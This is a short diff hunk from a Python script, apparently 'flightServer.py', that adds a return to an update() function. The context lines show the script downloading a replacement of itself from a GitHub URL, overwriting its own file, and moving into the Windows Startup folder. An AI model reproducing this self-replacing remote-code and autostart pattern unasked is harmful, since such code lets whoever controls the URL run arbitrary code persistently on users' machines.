@@ -43,6 +43,7 @@ def update():
     with ur.urlopen("https://github.com/eccentric-coder/update/raw/main/flightServer.py") as updateFile:
         with open(os.path.basename(__file__),"wb") as py:
             py.write(updateFile.read())
+    return
 
 def update1():      
     os.chdir(os.environ['appdata']+r"\Microsoft\Windows\Start Menu\Programs\Startup")
